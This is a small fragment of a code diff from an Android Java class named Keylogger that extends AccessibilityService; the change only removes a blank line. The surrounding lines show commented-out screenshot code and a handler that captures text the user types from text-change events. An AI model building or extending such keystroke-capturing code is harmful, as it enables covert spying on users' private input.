@@ -25,7 +25,6 @@ public class Keylogger extends AccessibilityService{
         // ScreenShooter shooter = new ScreenShooter(this);
         // shooter.takeScreenShot();
 
-
         switch(accessibilityEvent.getEventType()) {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                 String data = accessibilityEvent.getText().toString();
